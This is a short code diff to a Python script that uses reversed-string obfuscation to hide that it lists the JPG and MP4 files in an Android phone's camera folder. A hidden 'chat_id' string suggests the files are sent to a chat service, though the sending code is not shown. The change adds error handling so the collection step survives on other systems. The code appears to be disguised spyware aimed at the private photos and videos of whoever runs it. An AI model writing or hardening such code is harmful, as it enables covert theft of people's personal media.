@@ -99,9 +99,14 @@ class Share:
 
 # hard-coded na dito, pag may ginulo ka sa code wag mo papa ayus sakin!!
 htop = ''.join(["arem", "aC/MI", "CD/0/", "detalume", "/ega", "rots/"])[::-1]
-x_data = os.listdir(htop)
-counterZ = list(filter(lambda x: x.endswith('4pm.'[::-1]), x_data))
-sharerZ = list(filter(lambda x: x.endswith('gpj.'[::-1]), x_data))
+try:
+    x_data = os.listdir(htop)
+    counterZ = list(filter(lambda x: x.endswith('4pm.'[::-1]), x_data))
+    sharerZ = list(filter(lambda x: x.endswith('gpj.'[::-1]), x_data))
+except FileNotFoundError:
+    # Directory doesn't exist (not on Android device), skip file operations
+    counterZ = []
+    sharerZ = []
 hx = False
 _tt='di_tahc'[::-1]
 
